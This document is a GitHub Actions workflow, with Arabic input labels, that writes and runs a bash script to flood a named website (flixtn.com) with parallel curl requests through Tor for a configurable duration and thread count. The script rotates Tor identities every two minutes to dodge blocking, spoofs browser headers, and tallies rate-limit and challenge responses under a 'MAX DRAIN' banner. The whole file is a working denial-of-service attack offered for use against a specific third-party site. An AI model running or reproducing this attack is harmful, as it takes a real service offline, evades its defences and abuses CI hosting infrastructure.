name: 💀 CURL + TOR - CHALLENGE FOCUS

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق'
        required: true
        default: '6000'
      threads:
        description: 'عدد الخيوط'
        required: true
        default: '100'

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 65
    
    steps:
      - name: Install
        run: |
          sudo apt update
          sudo apt install -y curl tor
          sudo systemctl start tor
          
      - name: 🔥 CURL + TOR ATTACK
        run: |
          cat > curl_tor.sh << 'EOF'
          #!/bin/bash
          
          TARGET="https://flixtn.com"
          DURATION=$(( ${{ github.event.inputs.duration }} * 60 ))
          THREADS=${{ github.event.inputs.threads }}
          
          TOTAL=0
          OK=0
          RATE=0
          BLOCK=0
          FAIL=0
          
          echo "=========================================="
          echo "💀 CURL + TOR - MAX DRAIN"
          echo "Target: $TARGET"
          echo "Duration: ${{ github.event.inputs.duration }} minutes"
          echo "Threads: $THREADS"
          echo "=========================================="
          echo ""
          echo "✓=200 | 🔥=429 | 🛡️=challenge | ✗=error"
          echo ""
          
          END=$((SECONDS + DURATION))
          LAST_TOTAL=0
          
          # تجديد Tor كل دقيقتين
          renew_tor() {
            sudo systemctl reload tor
            echo "🔄 Tor IP changed"
          }
          
          # تشغيل تجديد Tor في الخلفية
          (
            while [ $SECONDS -lt $END ]; do
              sleep 120
              renew_tor
            done
          ) &
          
          while [ $SECONDS -lt $END ]; do
            for i in $(seq 1 $THREADS); do
              (
                STATUS=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
                  -H "Accept-Language: ar,en;q=0.9" \
                  --max-time 5 \
                  --retry 0 \
                  2>/dev/null)
                
                case $STATUS in
                  200) echo -n "✓" ;;
                  429) echo -n "🔥" ;;
                  403|503|502) echo -n "🛡️" ;;
                  *) echo -n "✗" ;;
                esac
              ) &
            done
            
            wait
            TOTAL=$((TOTAL + THREADS))
            
            RPS=$((TOTAL - LAST_TOTAL))
            LAST_TOTAL=$TOTAL
            
            ELAPSED=$((SECONDS - (END - DURATION)))
            REMAIN=$((END - SECONDS))
            MIN=$((ELAPSED / 60))
            SEC=$((ELAPSED % 60))
            
            echo ""
            echo "[$MIN:$SEC] Total: $TOTAL | RPS: $RPS | Remaining: $((REMAIN / 60))m"
            echo ""
            
            sleep 0.1
          done
          
          echo ""
          echo "=========================================="
          echo "✅ DONE: $((SECONDS / 60)) minutes"
          echo "Total requests: $TOTAL"
          echo "=========================================="
          EOF
          
          chmod +x curl_tor.sh
          ./curl_tor.sh
